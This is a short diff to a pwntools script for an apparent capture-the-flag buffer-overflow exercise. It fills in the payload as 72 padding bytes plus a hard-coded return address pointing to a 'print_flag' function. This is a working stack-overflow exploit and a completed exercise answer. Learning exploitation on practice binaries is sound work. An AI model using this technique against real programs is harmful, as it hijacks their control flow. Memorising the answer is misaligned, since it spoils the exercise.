@@ -8,7 +8,12 @@ r = process([exe.path])
 
 win = exe.symbols["print_flag"]
 #write your payload here, prompt: it should be overwrite the saved base pointer (rbp), positioning the payload right at the saved return address, then add p64(win).
-# payload = 
+payload = b""
+for i in range(72):
+    payload += b"\x00"
+
+# little endian
+payload += b"\x36\x12\x40\x00\x00\x00\x00\x00"
 
 r.recvuntil(b"What's your name? ")
 r.sendline(payload)
